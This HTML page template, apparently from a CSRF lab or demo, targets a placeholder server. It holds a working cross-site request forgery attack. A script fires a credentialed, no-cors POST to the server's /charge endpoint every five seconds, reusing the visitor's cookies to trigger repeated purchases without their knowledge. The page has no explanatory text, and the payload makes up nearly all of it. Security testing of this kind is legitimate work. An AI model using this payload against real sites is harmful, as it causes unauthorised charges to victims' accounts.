<!DOCTYPE html>
<html lang="en">
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <link rel="icon" href="data:;base64,=">
    <title>form page</title>
</head>
<body>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js"></script>
    <script src="http://code.jquery.com/ui/1.9.2/jquery-ui.js"></script>
    <h1>form page</h1>
    <p><a href="http://{{server_b}}/auth">auth_page</a></p>
    <p><a href="http://{{server_b}}/out">to reset cookie</a></p>
    <h2>Please, fill out the form</h2>
    <form name="test" id="MyForm" method="POST" action="http://{{server_b}}/charge">
        <input type="text" name="purchase" value=10>
        <p><input type="submit" name="Submit"></p>
    </form>
    <script>
        $(document).ready(function()
        {
            setInterval(function(){
                var url = 'http://{{server_b}}/charge';
                var
                    oldForm = document.forms.test,
                    formData = new FormData(oldForm)
                ;
                fetch(url, {
                    method: 'POST',
                    body: formData,
                    mode: 'no-cors',
                    credentials: 'include',
                    headers: {'Content-Type': 'text/html'},
                });
            }, 5000);
        });
    </script>
</body>
</html>
